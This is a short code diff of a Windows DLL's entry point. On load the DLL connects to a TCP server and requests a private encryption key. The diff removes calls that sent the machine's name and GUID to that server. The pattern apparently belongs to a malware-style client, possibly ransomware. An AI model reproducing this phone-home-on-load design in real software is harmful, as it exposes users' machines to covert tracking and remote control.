@@ -71,13 +71,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		if ( !me.Connect() )
 			me.~Client();
 
-		me.SendComputerNameToServer();
-		me.SendMachineGUIDToServer();
-
-		ClientRequest req(ClientRequest::REQUEST_PRIVATE_ENCRYPTION_KEY);
-		//me.SendEncryptedMessageToServer(me.TCPServerDetails, req);
+		ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
 		me.MakeTCPRequest(req, TRUE);
-		//NetCommon::TransmitData(req, me.TCPSocket, TCP, NetCommon::_default, TRUE, NetCommon::GetBIOFromString(me.Secrets.strPublicKey));
 
 		while ( 1 ) {
 			std::this_thread::sleep_for(std::chrono::seconds(1));
